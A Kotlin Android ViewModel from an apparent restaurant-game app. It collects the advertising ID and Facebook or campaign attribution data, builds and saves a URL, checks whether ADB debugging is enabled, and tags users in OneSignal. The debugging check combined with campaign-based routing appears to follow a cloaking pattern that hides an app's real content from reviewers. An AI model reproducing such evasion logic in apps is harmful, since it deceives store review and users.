package es.parrotgames.restaurantcit.presentation.viewmodel

import android.content.Context
import android.provider.Settings
import androidx.activity.ComponentActivity
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.onesignal.OneSignal
import com.tr.v3.data.worker.Initializer
import dagger.hilt.android.lifecycle.HiltViewModel
import es.parrotgames.restaurantcit.joker_library.data.entity.AdbEntity
import es.parrotgames.restaurantcit.joker_library.data.entity.UrlEntity
import es.parrotgames.restaurantcit.joker_library.link_constructor.Constructor
import es.parrotgames.restaurantcit.lepry_repo.bd.JokerBdRepo
import es.parrotgames.restaurantcit.lepry_repo.network.NetworkRepo
import es.parrotgames.restaurantcit.presentation.states.TridentDataLoaded
import es.parrotgames.restaurantcit.presentation.states.FacebookDataLoaded
import es.parrotgames.restaurantcit.presentation.states.JokerState
import es.parrotgames.restaurantcit.presentation.states.Loader
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import javax.inject.Inject

@HiltViewModel
class JokerViewModel @Inject constructor(
    private val bdRepo: JokerBdRepo,
    private val networkRepo: NetworkRepo
) : ViewModel() {

    private var gadid: String = ""

    private val _dataState: MutableStateFlow<JokerState<String>> = MutableStateFlow(Loader)

    val dataState: StateFlow<JokerState<String>>
        get() = _dataState

    fun fetchData(activity: ComponentActivity) {
        viewModelScope.launch(Dispatchers.IO) {
            _dataState.value = Loader
            gadid = networkRepo.getGadid()
            val fbData: Any? = networkRepo.getFbData()
            if (fbData != null) {
                Constructor().start(fbData = fbData, gadid = gadid)
                _dataState.value = FacebookDataLoaded(Constructor().start(fbData = fbData, gadid = gadid))
                sendSignalTag(dataFb = fbData)
            } else {
                Initializer().start(activity, gadid)
            }
        }
    }

    fun doWorkFromTridentV3(data: MutableMap<String, Any?>?) {
        viewModelScope.launch(Dispatchers.IO) {
            if (gadid.isEmpty()) {
                gadid = networkRepo.getGadid()
                _dataState.value =
                    TridentDataLoaded(Constructor().start(tridentV3 = data, gadid = gadid))
                sendSignalTag(dataTridentV3 = data)
            } else {
                _dataState.value =
                    TridentDataLoaded(Constructor().start(tridentV3 = data, gadid = gadid))
                sendSignalTag(dataTridentV3 = data)
            }
        }
    }

    suspend fun getAdb(context: Context): String = withContext(viewModelScope.coroutineContext) {
        setAdb(context)
        return@withContext bdRepo.getAdb()?.adb ?: ""
    }

    private suspend fun setAdb(context: Context) {
        withContext(viewModelScope.coroutineContext) {
            val adb = Settings.Global.getString(
                context.contentResolver,
                Settings.Global.ADB_ENABLED
            )
            bdRepo.setAdb(AdbEntity(adb = adb))
        }
    }

    suspend fun getUrl(): String = withContext(viewModelScope.coroutineContext + Dispatchers.IO) {
        return@withContext bdRepo.getUrl()?.url ?: ""
    }


    fun saveUrl(url: String) {
        viewModelScope.launch {
            val str = getUrl()
            if (str.isEmpty()) {
                var num = getSavedCount()
                num += 1
                bdRepo.saveUrl(UrlEntity(url = url, savedCount = num))
            }
        }
    }

    private suspend fun getSavedCount(): Int = withContext(viewModelScope.coroutineContext + Dispatchers.IO) {
        return@withContext bdRepo.getUrl()?.savedCount ?: 0
    }

    private fun sendSignalTag(dataFb: Any) {
        OneSignal.sendTag("key2", dataFb.toString().replace("myapp://", "").substringBefore("/"))
    }

    private fun sendSignalTag(dataTridentV3: MutableMap<String, Any?>?) {
        val cmpg = dataTridentV3?.get("cmpg_name").toString()

        if (cmpg != "null") {
            OneSignal.sendTag("key2", cmpg.substringBefore("_"))
        } else {
            OneSignal.sendTag("key2", "organic")
        }
    }
}